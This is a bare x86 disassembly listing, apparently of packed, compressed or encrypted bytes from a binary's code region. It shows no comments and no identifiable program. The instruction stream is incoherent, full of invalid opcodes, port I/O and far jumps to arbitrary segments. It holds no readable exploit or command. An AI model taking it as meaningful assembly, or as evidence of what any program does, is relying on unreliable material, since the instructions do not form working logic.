  40eaec:	xchg   DWORD PTR [edi+0x1cc9e2e5],ebx
  40eaf2:	mov    al,0x55
  40eaf4:	and    BYTE PTR [ebp-0x21],cl
  40eaf7:	pop    ebx
  40eaf8:	sub    BYTE PTR [edi-0x51],dh
  40eafb:	pop    ss
  40eafc:	xchg   edx,eax
  40eafd:	rol    BYTE PTR [eax-0x6f57dfab],cl
  40eb03:	sub    al,0xc5
  40eb05:	jmp    0x40eae9
  40eb07:	aam    0x4e
  40eb09:	out    0xf2,al
  40eb0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb0c:	mov    ds:0xf1e07de,eax
  40eb11:	aas    
  40eb12:	dec    ecx
  40eb13:	xor    esi,DWORD PTR [esi-0x589b5e85]
  40eb19:	push   0xffffff91
  40eb1b:	push   ecx
  40eb1c:	push   eax
  40eb1d:	test   eax,0xc1151f92
  40eb22:	mov    al,ds:0x10a9fe1e
  40eb27:	in     eax,dx
  40eb28:	in     eax,0x41
  40eb2a:	adc    al,dl
  40eb2c:	sub    BYTE PTR [eax-0x22c5d6a1],al
  40eb32:	(bad)  
  40eb33:	aam    0x46
  40eb35:	ins    DWORD PTR es:[edi],dx
  40eb36:	xchg   BYTE PTR [edx],al
  40eb38:	inc    esi
  40eb39:	addr16 jle 0x40eb2b
  40eb3c:	inc    edi
  40eb3d:	mov    eax,0xea043602
  40eb42:	mov    dl,al
  40eb44:	imul   edi,DWORD PTR [edi],0xffffff89
  40eb47:	xor    BYTE PTR [esi+0x2a],0x71
  40eb4b:	cli    
  40eb4c:	and    BYTE PTR [edx+0x2],bl
  40eb4f:	imul   esi,DWORD PTR [bp+di-0x1a56],0xb31e9ab5
  40eb58:	int3   
  40eb59:	fistp  DWORD PTR [edx-0x1b46a201]
  40eb5f:	fst    DWORD PTR [esi-0x70]
  40eb62:	mov    ah,0xe2
  40eb64:	mov    edx,esi
  40eb66:	xchg   esp,eax
  40eb67:	sbb    BYTE PTR [ecx+0xd882de1],ah
  40eb6d:	mov    cl,0x83
  40eb6f:	int    0x5b
  40eb71:	fmul   QWORD PTR [ebx]
  40eb73:	shr    ecx,1
  40eb75:	push   edx
  40eb76:	xchg   edi,eax
  40eb77:	popf   
  40eb78:	fimul  DWORD PTR [eax+0x2a]
  40eb7b:	mov    bl,0x3f
  40eb7d:	sbb    DWORD PTR [eax+edx*1+0x6a],esi
  40eb81:	cmp    al,0xb4
  40eb83:	fsub   DWORD PTR [ebx+0x50]
  40eb86:	neg    DWORD PTR [edx+0x68f60ff2]
  40eb8c:	jg     0x40eb2e
  40eb8e:	xor    esp,DWORD PTR [edx]
  40eb90:	mov    ch,0xea
  40eb92:	(bad)  cs:[ebx]
  40eb95:	jb     0x40eb77
  40eb97:	mov    ds:0x2e864e73,eax
  40eb9c:	push   ebx
  40eb9d:	dec    ebx
  40eb9e:	xchg   ecx,eax
  40eb9f:	push   es
  40eba0:	std    
  40eba1:	jbe    0x40eb9b
  40eba3:	or     al,bh
  40eba5:	rol    ah,0x97
  40eba8:	adc    BYTE PTR [ebx-0x298388d9],al
  40ebae:	sub    bh,BYTE PTR [eax]
  40ebb0:	sbb    dl,0xc4
  40ebb3:	es ret 
  40ebb5:	or     ch,BYTE PTR [edi+0x4323f3]
  40ebbb:	in     al,0x55
  40ebbd:	mov    ds:0x398768e0,al
  40ebc2:	aam    0x63
  40ebc4:	(bad)  
  40ebc5:	or     al,0x74
  40ebc7:	jmp    0x9215:0xde16d928
  40ebce:	mov    edi,0xf52750f2
  40ebd3:	mov    ax,ds:0x1f9d8528
  40ebd9:	jno    0x40ebc4
  40ebdb:	ja     0x40eba4
  40ebdd:	and    edi,DWORD PTR [eax]
  40ebdf:	or     DWORD PTR [eax+0x1bbde85b],esi
  40ebe5:	imul   eax,DWORD PTR [ecx],0xffffffe8
  40ebe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe9:	mov    edx,0xcfa8c7e
  40ebee:	iret   
  40ebef:	fld    TBYTE PTR [esi]
  40ebf1:	les    ecx,FWORD PTR ds:0x8320cebd
  40ebf7:	and    ecx,esi
  40ebf9:	mov    dh,0x51
  40ebfb:	mov    DWORD PTR [edi],esp
  40ebfd:	ds or  al,0x56
  40ec00:	sub    BYTE PTR [esi-0x5c],bh
  40ec03:	popf   
  40ec04:	in     eax,dx
  40ec05:	or     DWORD PTR [edx-0x7ee6889],edx
  40ec0b:	cs inc edi
  40ec0d:	fisubr WORD PTR [edi-0x42]
  40ec10:	inc    esp
  40ec11:	lea    ebx,[ecx-0x10b18aa0]
  40ec17:	inc    edi
  40ec18:	aaa    
  40ec19:	inc    ebp
  40ec1a:	loope  0x40ec22
  40ec1c:	test   al,0xf4
  40ec1e:	xchg   ebx,eax
  40ec1f:	ficomp DWORD PTR [ebx]
  40ec21:	aaa    
  40ec22:	sub    bh,al
  40ec24:	add    eax,0xc5976440
  40ec29:	mov    edi,0xedfa62af
  40ec2e:	jns    0x40ec27
  40ec30:	mov    eax,0x662c808d
  40ec35:	jae    0x40ecb5
  40ec37:	test   eax,0x1205354f
  40ec3c:	cli    
  40ec3d:	data16 das 
  40ec3f:	pop    esp
  40ec40:	shr    al,0xa7
  40ec43:	xchg   DWORD PTR [edi+ebx*1-0x2b],edi
  40ec47:	mov    al,ds:0xc4248ced
  40ec4c:	push   esi
  40ec4d:	dec    esp
  40ec4e:	jecxz  0x40ec8e
  40ec50:	arpl   WORD PTR [edi-0x71],bx
  40ec53:	inc    ecx
  40ec54:	fild   WORD PTR [edx-0x7d]
  40ec58:	(bad)  
  40ec59:	push   ebp
  40ec5a:	addr16 adc ecx,ebp
  40ec5d:	xchg   ebp,eax
  40ec5e:	lock pop eax
  40ec60:	ficom  DWORD PTR [edi+edi*2]
  40ec63:	outs   dx,BYTE PTR ds:[esi]
  40ec64:	dec    ecx
  40ec65:	inc    esp
  40ec66:	into   
  40ec67:	je     0x40ecd8
  40ec69:	out    0x63,al
  40ec6b:	and    dl,BYTE PTR [esi-0x28]
  40ec6e:	fldcw  WORD PTR [edx-0x5]
  40ec71:	lods   al,BYTE PTR ds:[esi]
  40ec72:	cdq    
  40ec73:	retf   0x3be
  40ec76:	js     0x86edeaa6
  40ec7c:	sar    BYTE PTR [edx+0x30],1
  40ec7f:	mov    ebp,0xf1eb77c3
  40ec84:	add    DWORD PTR [edi],esi
  40ec86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec87:	pop    ss
  40ec88:	sub    DWORD PTR [esi-0x42],edx
  40ec8b:	inc    edi
  40ec8c:	push   esi
  40ec8d:	pop    eax
  40ec8e:	gs jo  0x40ec2d
  40ec91:	mov    ds:0x9bed2a02,eax
  40ec96:	sbb    eax,0x7a3aeeba
  40ec9b:	into   
  40ec9c:	jnp    0x40eceb
  40ec9e:	lock repnz or edi,0xac373161
  40eca6:	sub    DWORD PTR [esi],edx
  40eca8:	push   esp
  40eca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecaa:	fild   QWORD PTR [ebx+esi*2-0xd]
  40ecae:	add    al,0xd0
  40ecb0:	ss (bad) 
  40ecb2:	dec    ebx
  40ecb3:	inc    edx
  40ecb4:	aas    
  40ecb5:	outs   dx,DWORD PTR ds:[esi]
  40ecb6:	push   ss
  40ecb7:	arpl   WORD PTR [eax+0x1918e203],si
  40ecbd:	mov    edi,0xa541520b
  40ecc2:	imul   al
  40ecc4:	outs   dx,DWORD PTR ds:[esi]
  40ecc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecc6:	adc    al,0xa5
  40ecc8:	mov    ds:0xcb75e97a,eax
  40eccd:	cwde   
  40ecce:	jmp    0xc24d:0xd0f57e93
  40ecd5:	sti    
  40ecd6:	dec    eax
  40ecd7:	jne    0x40ec92
  40ecd9:	jne    0x40ecf2
  40ecdb:	in     eax,0xb2
  40ecdd:	jl     0x40ecf5
  40ecdf:	repz fisub DWORD PTR [edi+ecx*8]
  40ece3:	addr16 mov ch,0x6
  40ece6:	inc    ebp
  40ece7:	cmc    
  40ece8:	dec    ebp
  40ece9:	les    ebx,FWORD PTR [eax]
  40eceb:	in     al,0x28
  40eced:	sbb    ecx,ebx
  40ecef:	push   esp
  40ecf0:	adc    dl,BYTE PTR [eax]
  40ecf2:	add    al,0x99
  40ecf4:	aad    0x63
  40ecf6:	aas    
  40ecf7:	xlat   BYTE PTR ds:[ebx]
  40ecf8:	xchg   esp,eax
  40ecf9:	jg     0x40ed43
  40ecfb:	cs or  al,0xfb
  40ecfe:	cmc    
  40ecff:	add    al,al
  40ed01:	inc    esp
  40ed02:	adc    al,0xc3
  40ed04:	or     ebp,edi
  40ed06:	fild   QWORD PTR [ecx-0x6b]
  40ed09:	hlt    
  40ed0a:	in     al,dx
  40ed0b:	and    ah,BYTE PTR [edx+0x1f]
  40ed0e:	xor    bl,BYTE PTR [esi]
  40ed10:	hlt    
  40ed11:	iret   
  40ed12:	daa    
  40ed13:	hlt    
  40ed14:	test   al,0xfb
  40ed16:	xchg   BYTE PTR [esi],dh
  40ed18:	jbe    0x40ed52
  40ed1a:	mov    al,0x9e
  40ed1c:	sbb    al,0x15
  40ed1e:	imul   edi,ebx,0x4e
  40ed21:	loope  0x40ed57
  40ed23:	pop    ds
  40ed24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed25:	add    dh,BYTE PTR [esi-0x65]
  40ed28:	sar    BYTE PTR [eax],1
  40ed2a:	gs jnp 0x40ed3e
  40ed2d:	push   ss
  40ed2e:	dec    ebx
  40ed2f:	sar    DWORD PTR [edi+eiz*2+0x7d],0x98
  40ed34:	jae    0x40ecdb
  40ed36:	mov    ch,0x9
  40ed38:	push   edi
  40ed39:	aam    0x27
  40ed3b:	mov    ebx,DWORD PTR [ebx+0x32]
  40ed3e:	cmc    
  40ed3f:	mov    esi,0xcff2ce1c
  40ed44:	ror    DWORD PTR [esi],cl
  40ed46:	xchg   ebx,eax
  40ed47:	add    DWORD PTR [esi],ebx
  40ed49:	(bad)  
  40ed4a:	pop    ecx
  40ed4b:	adc    BYTE PTR [eax-0x2c],0x2a
  40ed4f:	popa   
  40ed50:	jne    0x40ed3c
  40ed52:	xor    ah,ah
  40ed54:	ins    BYTE PTR es:[edi],dx
  40ed55:	add    DWORD PTR [esi+0x1f],edi
  40ed58:	icebp  
  40ed59:	adc    BYTE PTR [edi-0x2b],bh
  40ed5c:	arpl   bp,cx
  40ed5e:	inc    ebp
  40ed5f:	pop    edi
  40ed60:	mov    ah,0x72
  40ed62:	jns    0x40ed88
  40ed64:	adc    eax,0xe97eba32
  40ed69:	mov    edi,0xc56a8479
  40ed6e:	push   eax
  40ed6f:	cmp    DWORD PTR [edx-0x78],esp
  40ed72:	rol    BYTE PTR [ecx+0x2c],0x37
  40ed76:	lods   eax,DWORD PTR ds:[esi]
  40ed77:	jmp    0xe335:0x65640e5c
  40ed7e:	stc    
  40ed7f:	and    edi,ebx
  40ed81:	or     ch,BYTE PTR [eax+0x55]
  40ed84:	dec    ebx
  40ed85:	mov    al,0x22
  40ed87:	sbb    bl,bh
  40ed89:	pushf  
  40ed8a:	psraw  mm5,mm4
  40ed8d:	rol    BYTE PTR [ebp-0x3529f194],cl
  40ed93:	std    
  40ed94:	hlt    
  40ed95:	jnp    0x40ed47
  40ed97:	(bad)  
  40ed98:	and    al,0x9b
  40ed9a:	in     al,0x7c
  40ed9c:	nop
  40ed9d:	out    0x84,al
  40ed9f:	adc    eax,0xd0ecf0e5
  40eda4:	fldcw  WORD PTR [ebx-0x5d]
  40eda7:	pop    ebx
  40eda8:	pop    es
  40eda9:	arpl   WORD PTR [eax],di
  40edab:	stos   BYTE PTR es:[edi],al
  40edac:	xchg   esp,eax
  40edad:	addr16 cdq 
  40edaf:	and    edi,esp
  40edb1:	mov    eax,ds:0x7c838f2d
  40edb6:	sti    
  40edb7:	jns    0x40ed81
  40edb9:	leave  
  40edba:	pop    ecx
  40edbb:	and    eax,0xc0d9db3e
  40edc0:	out    0xb0,eax
  40edc2:	mov    dl,0xec
  40edc4:	sub    BYTE PTR [esi-0x39739ce6],dh
  40edca:	lock mov ebp,0xaa4a9af4
  40edd0:	add    ebx,edx
  40edd2:	bnd call 0xa851476a
  40edd8:	in     al,0x39
  40edda:	f2xm1  
  40eddc:	jb     0x40ee0f
  40edde:	data16 (bad) 
  40ede0:	jmp    0x40ee42
  40ede2:	fdivr  DWORD PTR [eax-0x12]
  40ede5:	int    0x25
  40ede7:	dec    ebx
  40ede8:	mov    ebp,0x22701f3c
  40eded:	and    al,0xb1
  40edef:	outs   dx,DWORD PTR ds:[esi]
  40edf0:	int    0xdb
  40edf2:	mov    bh,0x7d
  40edf4:	jecxz  0x40ee61
  40edf6:	mov    bl,0xa2
  40edf8:	imul   esp,DWORD PTR [edx+edi*1-0x7f],0xffffffaf
  40edfd:	test   al,0x24
  40edff:	dec    edx
  40ee00:	mov    bx,0x9888
  40ee04:	leave  
  40ee05:	jl     0x40ee5d
  40ee07:	add    esi,DWORD PTR [eax+0x1]
  40ee0a:	out    dx,al
  40ee0b:	inc    ecx
  40ee0c:	cmp    dl,bl
  40ee0e:	bound  esi,QWORD PTR [ebx-0x36cb940f]
  40ee14:	mov    ebp,?
  40ee16:	(bad)  
  40ee17:	popf   
  40ee18:	(bad)  ds:0x7896e7c8
  40ee1e:	jl     0x40edd5
  40ee20:	xor    DWORD PTR ds:0x36ad8a22,edx
  40ee26:	fistp  QWORD PTR [eax+0x356ae41e]
  40ee2c:	shr    BYTE PTR [eax],0x83
  40ee2f:	stos   BYTE PTR es:[edi],al
  40ee30:	pop    ebx
  40ee31:	and    DWORD PTR [ebx+0x20],esi
  40ee34:	pusha  
  40ee35:	jne    0x40ee84
  40ee37:	out    dx,eax
  40ee38:	pushf  
  40ee39:	mov    ds:0x8da1c918,eax
  40ee3e:	mov    gs,WORD PTR [esi+0x57]
  40ee41:	or     esi,ecx
  40ee43:	dec    BYTE PTR [ecx]
  40ee45:	adc    al,0xbb
  40ee47:	lds    edi,FWORD PTR [ecx-0x5]
  40ee4a:	(bad)  
  40ee4b:	std    
  40ee4c:	xor    ch,BYTE PTR ds:0x6273016f
  40ee52:	fcom   QWORD PTR [ebp+0x7895eeef]
  40ee58:	sub    bl,BYTE PTR [edx+0x13d6465a]
  40ee5e:	mov    ds:0x5e0e4776,eax
  40ee63:	sahf   
  40ee64:	jecxz  0x40ee67
  40ee66:	jno    0x40eeb5
  40ee68:	xchg   esi,eax
  40ee69:	outs   dx,BYTE PTR ds:[esi]
  40ee6a:	jg     0x40ee4f
  40ee6c:	out    0xa7,eax
  40ee6e:	rcr    DWORD PTR [eax],1
  40ee70:	jmp    0x40ee12
  40ee72:	(bad)  
  40ee73:	xchg   edi,eax
  40ee74:	push   ss
  40ee75:	sub    edx,DWORD PTR [edi]
  40ee77:	fsqrt  
  40ee79:	ss (bad) 
  40ee7d:	(bad)  
  40ee7e:	xor    bh,BYTE PTR [eax+0x4413cc5e]
  40ee84:	cdq    
  40ee85:	nop
  40ee86:	jo     0x40ee7a
  40ee88:	adc    al,0x1
  40ee8a:	in     eax,0x5e
  40ee8c:	lods   eax,DWORD PTR ds:[esi]
  40ee8d:	and    eax,0xcf26d645
  40ee92:	dec    ebx
  40ee93:	jg     0x40ee93
  40ee95:	mov    eax,0x8e51c27d
  40ee9a:	add    al,0xb0
  40ee9c:	pop    ebx
  40ee9d:	fs retf 
  40ee9f:	int    0x7a
  40eea1:	(bad)  
  40eea2:	addr16 ja 0x40ef0c
  40eea5:	jecxz  0x40eeaa
  40eea7:	or     al,0x43
  40eea9:	xchg   ebx,eax
  40eeaa:	js     0x40ee77
  40eeac:	xchg   esp,eax
  40eead:	push   ebp
  40eeae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeaf:	jb     0x40eed1
  40eeb1:	cmp    esi,DWORD PTR [ebx+ebp*1+0x2d6cef0e]
  40eeb8:	es pop ecx
  40eeba:	mov    ds:0xc6db6721,eax
  40eebf:	mov    edx,0x5cb67c9
  40eec4:	call   0xb1dc:0x81ef4118
  40eecb:	pop    edi
  40eecc:	push   esi
  40eecd:	mov    ds:0x8dcbe34c,al
  40eed2:	test   al,0xad
  40eed4:	out    dx,al
  40eed5:	pusha  
  40eed6:	mov    ebx,0x2676ed04
  40eedb:	div    DWORD PTR [eax+0x31018d4c]
  40eee1:	lds    eax,FWORD PTR [edx]
  40eee3:	cmp    eax,0x1dbb9c17
  40eee8:	mov    bh,0x3f
  40eeea:	(bad)  
  40eeeb:	call   0xb79f:0x23177455
  40eef2:	aaa    
  40eef3:	inc    edi
  40eef4:	add    DWORD PTR [ebp-0x57730ff6],edi
  40eefa:	imul   BYTE PTR [edi-0x3b4adec7]
  40ef00:	es jp  0x40ef4f
  40ef03:	jge    0x40eeaa
  40ef05:	pusha  
  40ef06:	sub    dl,BYTE PTR cs:[ebx+0x2691d9b]
  40ef0d:	jno    0x40eec8
  40ef0f:	jmp    0x40ee96
  40ef11:	(bad)
  40ef15:	outs   dx,DWORD PTR ds:[esi]
  40ef16:	cmp    DWORD PTR [edi-0x515eca28],0xfffffff3
  40ef1d:	int    0x9c
  40ef1f:	sub    DWORD PTR [esi-0x7],ebx
  40ef22:	xchg   BYTE PTR [eax+0x34],dl
  40ef25:	mov    eax,ds:0x428fa106
  40ef2b:	push   0x19aebe19
  40ef30:	adc    BYTE PTR [edx+0x17],ah
  40ef33:	sub    cl,BYTE PTR [esi]
  40ef35:	and    DWORD PTR [eax+0x26],esi
  40ef38:	sub    edx,DWORD PTR [ecx-0x71a24960]
  40ef3e:	push   esp
  40ef3f:	mov    dl,0x20
  40ef41:	(bad)
  40ef45:	mov    DWORD PTR [ecx],esp
  40ef47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef48:	lds    edi,FWORD PTR [edi-0x1f]
  40ef4b:	dec    edi
  40ef4c:	push   eax
  40ef4d:	or     esi,esp
  40ef4f:	imul   DWORD PTR [eax]
  40ef51:	pop    eax
  40ef52:	sub    ebx,DWORD PTR [eax+0x28]
  40ef55:	or     al,0x39
  40ef57:	mov    ebx,0xa9fcd2cc
  40ef5c:	pushf  
  40ef5d:	test   al,0x7a
  40ef5f:	adc    DWORD PTR [ebx+edx*2],ebp
  40ef62:	ret    0xc4a2
  40ef65:	in     al,dx
  40ef66:	mov    esp,DWORD PTR [ebp+0x1df1889f]
  40ef6c:	sahf   
  40ef6d:	call   0xccc899ce
  40ef72:	mov    ch,BYTE PTR [ecx+0x2f28fb8]
  40ef78:	rsqrtps xmm5,xmm5
  40ef7b:	jmp    0x40efae
  40ef7d:	les    esp,FWORD PTR [ebx+0x590852d5]
  40ef83:	ins    DWORD PTR es:[edi],dx
  40ef84:	dec    BYTE PTR [edx+eiz*1]
  40ef87:	adc    al,0xdd
  40ef89:	mov    ah,0x6e
  40ef8b:	in     al,0x4f
  40ef8d:	retf   0x373b
  40ef90:	cld    
  40ef91:	mov    eax,ds:0x2dd7c9b
  40ef96:	xor    eax,0x895f59a3
  40ef9b:	lds    ecx,FWORD PTR [eax+0x6d69d85a]
  40efa1:	loopne 0x40ef5c
  40efa3:	or     eax,0x4b1c3588
  40efa8:	aaa    
  40efa9:	(bad)  
  40efaa:	jmp    0x40ef4f
  40efac:	bnd jae 0x40ef2f
  40efaf:	inc    esp
  40efb0:	push   edi
  40efb1:	mov    esp,0x44176848
  40efb6:	popf   
  40efb7:	dec    esi
  40efb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb9:	lods   eax,DWORD PTR ds:[esi]
  40efba:	inc    eax
  40efbb:	fadd   st,st(1)
  40efbd:	mov    esi,0x9ab56d47
  40efc2:	and    edx,DWORD PTR [ebp-0x61]
  40efc5:	js     0x40f029
  40efc7:	push   edi
  40efc8:	jge    0x40ef77
  40efca:	(bad)  
  40efcb:	out    0x94,eax
  40efcd:	out    dx,eax
  40efce:	add    eax,0xee63b764
  40efd3:	mov    ah,0x1
  40efd5:	shl    DWORD PTR [ebp+edi*2-0x78577739],1
  40efdc:	lods   al,BYTE PTR ds:[esi]
  40efdd:	jle    0x40eff2
  40efdf:	test   BYTE PTR [eax-0x986da51],al
  40efe5:	(bad)  
  40efe6:	rcl    BYTE PTR [eax+0x79],1
  40efe9:	sub    al,0x70
  40efeb:	(bad)  
  40efec:	(bad)
  40efef:	mov    ds,WORD PTR [edx]
  40eff1:	xchg   esi,eax
  40eff2:	shr    BYTE PTR [edx+0x38],0x84
  40eff6:	je     0x40f025
  40eff8:	ror    DWORD PTR [esp+esi*2],1
  40effb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40effc:	ret    
  40effd:	sbb    eax,0x7c407af
  40f002:	fdiv   st,st(0)
  40f004:	sahf   
  40f005:	jnp    0x40f053
  40f007:	leave  
  40f008:	fistp  QWORD PTR [edi+0x972b941]
  40f00e:	inc    ecx
  40f00f:	dec    esp
  40f010:	mov    edi,0x3bb63c54
  40f015:	sar    BYTE PTR [eax],0xec
  40f018:	cmp    eax,DWORD PTR [ecx+0x2f30eb2e]
  40f01e:	aas    
  40f01f:	bound  ebx,QWORD PTR [ecx-0x53e9ca94]
  40f025:	push   ss
  40f026:	rcr    DWORD PTR [edx+0x28],0x7f
  40f02a:	mov    ch,0xb5
  40f02c:	sti    
  40f02d:	adc    al,0xf8
  40f02f:	imul   edx,DWORD PTR ds:0xb0e889bd,0xde95aaae
  40f039:	mov    ebx,DWORD PTR ds:0x90350256
  40f03f:	ja     0x40f0ba
  40f041:	imul   edi,DWORD PTR [eax+0x23bbcd18],0x204ff3fa
  40f04b:	dec    ebp
  40f04c:	cmp    DWORD PTR [eax-0x39dcb142],ebp
  40f052:	jmp    0xd7f1d10d
  40f057:	shl    DWORD PTR [eax-0x6b436f8e],cl
  40f05d:	mov    bl,0xe8
  40f05f:	lods   al,BYTE PTR ds:[esi]
  40f060:	std    
  40f061:	out    dx,al
  40f062:	fwait
  40f063:	xchg   esp,eax
  40f064:	fst    DWORD PTR [ecx-0x3fec542e]
  40f06a:	cmp    dh,BYTE PTR [ebp+0x12]
  40f06d:	push   ecx
  40f06e:	xchg   esp,eax
  40f06f:	and    eax,0x8f668d2d
  40f074:	pushf  
  40f075:	ja     0x40f082
  40f077:	(bad)  
  40f078:	and    eax,0x1771cc4b
  40f07d:	sbb    DWORD PTR [ebx+0x53],0xc46742e8
  40f084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f085:	and    edi,esi
  40f087:	push   ds
  40f088:	aas    
  40f089:	push   0x2a03b403
  40f08e:	dec    edi
  40f08f:	or     eax,0x9e300d7f
  40f094:	fsub   st(3),st
  40f096:	add    dh,dh
  40f098:	leave  
  40f099:	or     al,0xf9
  40f09b:	inc    esp
  40f09c:	mov    BYTE PTR [esi+0x2b74347b],dh
  40f0a2:	or     BYTE PTR [ebp-0x199a8fdc],dh
  40f0a8:	bound  edx,QWORD PTR [esi]
  40f0aa:	dec    ecx
  40f0ab:	sar    eax,1
  40f0ad:	cmp    ebp,DWORD PTR [edi+0x76]
  40f0b0:	mov    bh,BYTE PTR [ebx]
  40f0b2:	xor    esi,DWORD PTR [eax-0x32]
  40f0b5:	rol    DWORD PTR cs:[ecx],cl
  40f0b8:	mov    ebx,0x9497a654
  40f0bd:	add    cl,BYTE PTR [eax-0x68]
  40f0c0:	sbb    ebp,ecx
  40f0c2:	js     0x40f11a
  40f0c4:	fnsave [ebx-0x58]
  40f0c7:	and    al,0x1d
  40f0c9:	xchg   edi,eax
  40f0ca:	inc    ebx
  40f0cb:	out    dx,eax
  40f0cc:	jnp    0x40f0a5
  40f0ce:	mov    ah,0x21
  40f0d0:	xchg   si,ax
  40f0d2:	add    ebx,DWORD PTR [edi]
  40f0d4:	sub    BYTE PTR [ebp-0x7720d273],bh
  40f0da:	push   0x2882445
  40f0df:	mov    bh,0xc9
  40f0e1:	mov    ds,WORD PTR [esi+0x31]
  40f0e4:	pop    ebp
  40f0e5:	sbb    BYTE PTR [esp+edi*2-0x7d],cl
  40f0e9:	fucomp st(3)
  40f0eb:	int    0xff
  40f0ed:	inc    ebx
  40f0ee:	xor    al,BYTE PTR ss:[ecx]
  40f0f1:	mov    esi,0x7b18df3
  40f0f6:	ret    
  40f0f7:	imul   esp,ebp,0xffffffb2
  40f0fa:	xchg   esi,eax
  40f0fb:	mov    ds:0xc2c1ffd3,al
  40f100:	pop    edx
  40f101:	or     ah,ch
  40f103:	sub    BYTE PTR [ebx-0x35a29719],bl
  40f109:	ficomp DWORD PTR [ebx-0x159c41a0]
  40f10f:	inc    edi
  40f110:	and    DWORD PTR [edx-0x2fbb1f07],esi
  40f116:	daa    
  40f117:	push   esi
  40f118:	nop
  40f119:	call   DWORD PTR [esi-0x63b90d1a]
  40f11f:	pcmpgtw mm7,QWORD PTR [eax+0x13e07d3d]
  40f126:	inc    esp
  40f127:	sbb    al,0xb2
  40f129:	push   eax
  40f12a:	pop    ss
  40f12b:	fidivr WORD PTR [ecx-0x5373d722]
  40f131:	retf   
  40f132:	rcl    dl,cl
  40f134:	cmp    DWORD PTR [edi+0x49],edx
  40f137:	or     ch,BYTE PTR fs:[edi+0x37]
  40f13b:	fcmovnbe st,st(0)
  40f13d:	call   0xf19b:0x26d9d12d
  40f144:	lock ja 0x40f0db
  40f147:	sub    dl,al
  40f149:	jbe    0x40f17b
  40f14b:	jmp    0x40f0f3
  40f14d:	cs leave 
  40f14f:	(bad)  
  40f150:	push   di
  40f152:	sbb    bh,BYTE PTR [esi-0x15597319]
  40f158:	push   0x2c
  40f15a:	imul   esp,DWORD PTR ds:0xbfefdb8a,0x1f
  40f161:	loopne 0x40f189
  40f163:	leave  
  40f164:	mov    ebp,0x261e3627
  40f169:	mov    esi,0x6ab364c8
  40f16e:	mov    esi,0x16638d5d
  40f173:	jae    0x40f142
  40f175:	mov    edi,0x65570ca8
  40f17a:	dec    esi
  40f17b:	icebp  
  40f17c:	mov    es,WORD PTR [esi-0x73]
  40f17f:	push   cs
  40f180:	test   al,0x3
  40f182:	mov    eax,ds:0x51dadc96
  40f187:	push   ss
  40f188:	pop    es
  40f189:	mov    cl,0x75
  40f18b:	push   0xffffff87
  40f18d:	imul   esp,esi,0x18
  40f190:	sub    edx,DWORD PTR [eax*4-0x16951217]
  40f197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f198:	jnp    0x40f1cd
  40f19a:	ret    0x58c3
  40f19d:	pop    ds
  40f19e:	dec    esp
  40f19f:	and    eax,0xabd1e7ac
  40f1a4:	(bad)  
  40f1a5:	ror    ch,0x89
  40f1a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1a9:	sbb    ebp,DWORD PTR [edi]
  40f1ab:	jmp    0x71f7:0x6590c253
  40f1b2:	bnd je 0x40f1f9
  40f1b5:	push   ebp
  40f1b6:	add    eax,0xd872b9d0
  40f1bb:	or     DWORD PTR [edi+edx*8+0x7f],edx
  40f1bf:	mov    ebx,0x38e3bc4
  40f1c4:	xchg   edi,eax
  40f1c5:	sar    dl,cl
  40f1c7:	jb     0x40f1c1
  40f1c9:	inc    ecx
  40f1ca:	mov    ebx,0x5ea4f47d
  40f1cf:	ret    
  40f1d0:	leave  
  40f1d1:	(bad)  
  40f1d2:	out    0x20,eax
  40f1d4:	test   DWORD PTR [ebx-0x4e],0x3079dd09
  40f1db:	or     eax,0xb2ba0711
  40f1e0:	mov    bl,0xf5
  40f1e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1e3:	xor    ecx,esi
  40f1e5:	iret   
  40f1e6:	xlat   BYTE PTR ds:[ebx]
  40f1e7:	cmc    
  40f1e8:	add    DWORD PTR [ebp-0x508cc3ad],esp
  40f1ee:	int3   
  40f1ef:	xchg   DWORD PTR [edx],ecx
  40f1f1:	lds    esp,FWORD PTR [eax]
  40f1f3:	mov    edx,0x7c3db1bb
  40f1f8:	dec    esp
  40f1f9:	loope  0x40f263
  40f1fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1fc:	(bad)  
  40f1fd:	ins    BYTE PTR es:[edi],dx
  40f1fe:	push   edx
  40f1ff:	cli    
  40f200:	idiv   BYTE PTR [ecx-0x76b7a53f]
  40f206:	or     DWORD PTR [ebx+0x4c],esi
  40f209:	addr16 push 0x2c
  40f20c:	sub    BYTE PTR [ebx],0xc9
  40f20f:	inc    ebx
  40f210:	les    ebp,FWORD PTR [edi]
  40f212:	iret   
  40f213:	jne    0x40f1f7
  40f215:	mov    cl,0x6a
  40f217:	mov    cl,0xe9
  40f219:	sbb    edx,DWORD PTR [ecx]
  40f21b:	aam    0xd4
  40f21d:	cli    
  40f21e:	rcr    BYTE PTR [esi+0x6d],1
  40f221:	into   
  40f222:	fnsave [ebp-0x14]
  40f225:	out    0xd2,al
  40f227:	call   0x6268:0x104ce766
  40f22e:	(bad)  
  40f22f:	fstp   st(4)
  40f231:	jnp    0x40f1f8
  40f233:	mov    DWORD PTR [edi+edi*1+0x2d],esi
  40f237:	clc    
  40f238:	fmul   QWORD PTR [esi]
  40f23a:	pop    ebp
  40f23b:	cmp    DWORD PTR [edi+0x4403e54f],edi
  40f241:	and    al,0x1f
  40f243:	add    eax,0x30e7ae36
  40f248:	outs   dx,DWORD PTR ds:[esi]
  40f249:	fisttp QWORD PTR [ecx]
  40f24b:	add    al,bh
  40f24d:	push   ss
  40f24e:	imul   ebx,ebp,0xffffffb7
  40f251:	mov    bl,0xe6
  40f253:	pop    edx
  40f254:	cmp    ebx,DWORD PTR [ebx]
  40f256:	cmp    edx,edi
  40f258:	aad    0x35
  40f25a:	fs jmp 0xb641:0xedbe742e
